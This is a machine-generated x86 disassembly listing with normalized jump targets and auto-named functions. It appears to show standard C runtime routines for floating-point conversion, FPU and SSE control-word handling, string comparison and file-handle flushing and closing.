shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_42c0e8
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_42c176
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_42c216
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_42c0e8
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_42c176
push eax
mov [ ebp - 0xc ] eax
call sub_42cad5
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_42c528
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_428620
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_41c34a
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_41c34a
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_42846b
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_4282f8
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_428415
pop ecx
test eax eax
jne r-xdata
call sub_42846b
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_4282f8
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_4283cc
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_427b11
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_42c6a0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_42c737
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_42a289
push esi
mov edi eax
call sub_42cce4
push esi
call sub_428620
push eax
call sub_42cc20
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_41a7eb
and [ esi + 0x1c ] 0x0
pop ecx
sub_42c7a4
push 0xc
push r--data
call sub_421220
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
push esi
call sub_428542
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_42c737
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42c810
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_421265
retn
mov eax [ ebp - 0x1c ]
sub_42c818
push 0x10
push r--data
call sub_421220
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_41c34a
mov [ eax ] 0x9
call sub_41c34a
mov [ eax ] 0x9
call sub_41efd5
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_421265
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_42a0e5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_41c34a
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_42a07c
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42c8e9
mov eax [ ebp - 0x1c ]
call sub_41c35d
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_42c8f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
ja r-xdata
lea ecx [ ebx + 0x1 ]
xor edx edx
cmp ecx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov ecx [ eax ]
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
mov ecx [ ebp - 0xc ]
inc ecx
mov [ ebp + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov ebx ecx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_42cad5
push 0x8
push r--data
call sub_421220
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_421265
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_42cb50
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_42cb84
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_42a07c
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_41c370
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_42a07c
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_42a07c
push 0x1
mov edi eax
call sub_42a07c
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_429ff6
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_42cc20
push 0x10
push r--data
call sub_421220
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41c35d
and [ eax ] 0x0
call sub_41c34a
mov [ eax ] 0x9
call sub_41efd5
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_421265
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_42a0e5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_41c34a
